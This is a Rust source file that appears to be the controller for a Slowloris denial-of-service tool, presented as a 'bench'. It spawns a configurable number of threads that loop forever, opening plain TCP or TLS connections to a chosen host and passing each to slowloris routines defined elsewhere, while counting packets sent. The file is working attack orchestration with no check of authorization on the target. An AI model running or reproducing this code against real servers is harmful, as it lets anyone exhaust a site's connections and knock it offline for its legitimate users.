#![allow(non_snake_case)]
use digest::generic_array::typenum::private::IsEqualPrivate;
use docopt::Docopt;
use std::net::TcpStream;
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use rustls::{OwnedTrustAnchor, RootCertStore};
//use rustls;
//mod slowloris_bench;
use super::*;
use crate::time_tools::time_stamp;
use std::sync::atomic::{AtomicUsize,Ordering};

static _PACKETS_SEND: AtomicUsize = AtomicUsize::new(0);


fn string_to_static_str(s: String) -> &'static str {
    Box::leak(s.into_boxed_str())
}
pub async fn slowloris_bench(opt:option::Opt) {


    //let cmd_mode = opt.cmd_mode.unwrap_or("GET".to_string());

    // Extract hostting information
    let mut host = option::Target::new(opt.url.clone(), opt.port);

    // Check for domain override
    host.set_domain(&opt.url);


    let mut root_certs =rustls::RootCertStore::empty();
    root_certs.add_server_trust_anchors(
        webpki_roots::TLS_SERVER_ROOTS
            .0
            .iter()
            .map(|ta| {
                rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                    ta.subject,
                    ta.spki,
                    ta.name_constraints,
                )
            }),
    );

    let ssl_config = rustls::ClientConfig::builder()
    .with_safe_defaults()
    .with_root_certificates(root_certs)
    .with_no_client_auth();
    
    let ssl_config = Arc::new(ssl_config);

    println!(
        "Beginning SlowLoris against host {} with {} threads.",
        host.get_designator(),
        opt.threads
    );
    thread::sleep(Duration::from_secs(1));
    let mut threads_handle = vec![];
    let opt_arc = Arc::new(opt);
 
    for i in 0..opt_arc.threads {
        print!("\rCreate New Thread {}", i);
        let opt_tmp=opt_arc.clone();
        let ssl_config = ssl_config.clone();
        let t=thread::spawn(move || { 
            _run(i,opt_tmp,ssl_config) });//.join().unwrap();
        //let t=thread::spawn(move || { thread_fn(i) });//.join().unwrap();
        threads_handle.push(t);
        
    }
    //timer
    print!("\rCreate Timer Thread {}", opt_arc.threads+1);
    let t=thread::spawn(move || { 
        crate::time_tools::timer(opt_arc.threads+1,&_PACKETS_SEND,5000) });//.join().unwrap();
    threads_handle.push(t);

    log::info!("slow mode start");
    log::info!("All Create Thread Num:{}",threads_handle.len());
    for t in threads_handle {
        t.join().unwrap();
    }

}
pub fn  _run(thread_num:u16,opt:Arc<option::Opt>,ssl_config:Arc<rustls::ClientConfig>) -> Result<String,String>{

    // Attempt to connect to the host.
    log::debug!("bench_host_port:{} {}",&opt.url,&opt.port);
    loop{
        let opt_tmp=opt.clone();
        let ssl_config_tmp=ssl_config.clone();
        // If needed, connect SSL to the host.
        if opt_tmp.domain.clone() {
            // Attempt to connect SSL
            let server_name=opt.url[..].try_into().unwrap();
            let mut ssl_stream = rustls::ClientConnection::new(ssl_config_tmp, server_name).unwrap();
            log::debug!("[CONTROL:{}] Successfully connected with TLS.", thread_num);
            slowloris::slowloris_tls(thread_num,&mut ssl_stream, opt_tmp,&_PACKETS_SEND);
            
        } 
        else {
            
            let mut tcp_stream = TcpStream::connect(opt_tmp.ip_port.clone())//"192.168.1.1:80".to_string())//
            .unwrap_or_else(|e| {log::error!("[CONTROL:{}] !!! Couldn't connect. {}", thread_num, e); println!("[CONTROL:{}] !!! Couldn't connect. {}", thread_num, e); panic!()});
            log::debug!("[CONTROL:{}] Succesfully connected to {}.", thread_num, opt_tmp.ip_port);
            slowloris::slowloris(thread_num,&mut tcp_stream, opt_tmp ,&_PACKETS_SEND);
        
        }
        _PACKETS_SEND.fetch_add(1, Ordering::SeqCst); 
    } 

}